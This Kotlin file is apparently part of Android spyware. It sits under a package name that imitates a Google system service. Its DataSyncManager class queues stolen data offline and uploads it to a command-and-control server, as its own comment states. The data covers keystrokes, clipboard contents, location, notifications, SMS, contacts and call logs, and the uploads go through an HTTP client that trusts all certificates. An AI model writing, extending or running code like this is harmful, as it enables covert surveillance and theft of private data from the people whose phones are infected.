package com.google.android.systemservice.utils

import android.content.Context
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject

/**
 * Syncs offline-queued data to the C2 server when connection is restored.
 * Called by CommandService on successful reconnect.
 */
class DataSyncManager(private val context: Context) {

    companion object {
        private const val TAG = "DataSync"
        private const val BATCH_SIZE = 50
        private val httpClient: OkHttpClient by lazy {
            TrustAllCertificates.createClientBuilder().build()
        }

        fun shutdown() {
            httpClient.dispatcher.executorService.shutdown()
            httpClient.connectionPool.evictAll()
        }
    }

    private val queue = OfflineDataQueue(context)
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /**
     * Enqueue data for offline storage. Called when HTTP upload fails.
     */
    fun enqueueOffline(type: String, jsonPayload: String) {
        queue.enqueue(type, jsonPayload, AndroidConfig.deviceId)
    }

    /**
     * Check if there's queued data waiting.
     */
    fun hasQueuedData(): Boolean = queue.hasQueuedData()

    /**
     * Get total queued item count.
     */
    fun queuedCount(): Int = queue.totalQueuedCount()

    /**
     * Flush all queued data to server. Call on reconnect.
     * Returns number of successfully uploaded items.
     */
    fun flushAll(onComplete: ((Int) -> Unit)? = null) {
        scope.launch {
            val result = flushAllSuspend()
            onComplete?.invoke(result)
        }
    }

    /**
     * Flush queued data and suspend until complete.
     * Single implementation for both sync and async callers.
     */
    suspend fun flushAllSuspend(): Int = withContext(Dispatchers.IO) {
        var totalUploaded = 0
        try {
            val allQueued = queue.getAllQueued()
            if (allQueued.isEmpty()) {
                Log.d(TAG, "No queued data to sync")
                return@withContext 0
            }

            Log.d(TAG, "Starting sync: ${allQueued.values.sumOf { it.size }} items across ${allQueued.size} types")

            for ((type, items) in allQueued) {
                val uploaded = uploadBatch(type, items)
                totalUploaded += uploaded
                if (uploaded == items.size) {
                    queue.clearType(type)
                }
            }

            Log.d(TAG, "Sync complete: $totalUploaded items uploaded")
        } catch (e: Exception) {
            Log.e(TAG, "Sync failed: ${e.message}")
        }
        totalUploaded
    }

    private suspend fun uploadBatch(type: String, items: List<OfflineDataQueue.QueueItem>): Int {
        val endpoint = getEndpointForType(type) ?: run {
            Log.w(TAG, "Unknown type: $type, skipping")
            return 0
        }

        var uploaded = 0
        val url = "${AndroidConfig.apiBaseUrl}/$endpoint"

        for (batch in items.chunked(BATCH_SIZE)) {
            try {
                val body = buildUploadPayload(type, batch)
                if (executeUpload(url, body)) {
                    uploaded += batch.size
                    Log.d(TAG, "Uploaded batch of ${batch.size} $type items")
                } else {
                    Log.w(TAG, "Batch upload failed for $type")
                }
                delay(200)
            } catch (e: Exception) {
                Log.e(TAG, "Batch upload error for $type: ${e.message}")
            }
        }

        return uploaded
    }

    private fun buildUploadPayload(type: String, batch: List<OfflineDataQueue.QueueItem>): RequestBody {
        val jsonArray = JSONArray()
        batch.forEach { item ->
            try {
                jsonArray.put(JSONObject(item.payload))
            } catch (e: Exception) {
                val wrapper = JSONObject()
                wrapper.put("data", item.payload)
                wrapper.put("timestamp", item.timestamp)
                wrapper.put("device_id", item.deviceId)
                jsonArray.put(wrapper)
            }
        }

        val body = JSONObject().apply {
            put("device_id", AndroidConfig.deviceId)
            put("batch", jsonArray)
            put("queued_count", batch.size)
            put("sync_type", "offline_flush")
        }

        return body.toString().toRequestBody("application/json".toMediaType())
    }

    private fun executeUpload(url: String, body: RequestBody): Boolean {
        val request = Request.Builder()
            .url(url)
            .post(body)
            .build()

        val response = httpClient.newCall(request).execute()
        return try {
            response.isSuccessful
        } finally {
            response.close()
        }
    }

    private fun getEndpointForType(type: String): String? {
        return when (type) {
            "keylog" -> "keylogger"
            "clipboard" -> "clipboard"
            "location" -> "location"
            "notification" -> "notifications"
            "sms" -> "sms"
            "contacts" -> "contacts"
            "calls" -> "calls"
            else -> null
        }
    }

    /**
     * Persist in-memory queue to disk (call in onDestroy/onLowMemory).
     */
    fun persistQueue() {
        queue.persistToDisk()
    }

    fun cancel() {
        scope.cancel()
    }
}
